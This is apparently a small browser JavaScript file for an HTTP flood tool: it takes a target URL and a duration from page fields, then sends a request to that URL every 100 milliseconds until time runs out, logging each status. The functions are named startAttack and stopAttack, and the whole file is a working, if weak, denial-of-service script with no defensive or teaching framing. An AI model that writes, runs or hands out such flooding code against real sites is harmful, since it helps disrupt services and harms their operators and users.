let attackInterval;
let attackTimeout;

function startAttack() {
    const targetUrl = document.getElementById('targetUrl').value;
    const duration = parseInt(document.getElementById('duration').value, 10) * 1000; // convert to milliseconds

    if (!targetUrl) {
        alert('Please enter a target URL.');
        return;
    }

    if (isNaN(duration) || duration <= 0) {
        alert('Please enter a valid duration.');
        return;
    }

    attackInterval = setInterval(() => {
        fetch(targetUrl)
            .then(response => console.log(`Request sent to ${targetUrl}, Status: ${response.status}`))
            .catch(error => console.error(`Error: ${error}`));
    }, 100); // Send request every 100 milliseconds (10 requests per second)

    attackTimeout = setTimeout(() => {
        stopAttack();
    }, duration); // Stop attack after specified duration
}

function stopAttack() {
    clearInterval(attackInterval);
    clearTimeout(attackTimeout);
    console.log('Attack stopped.');
}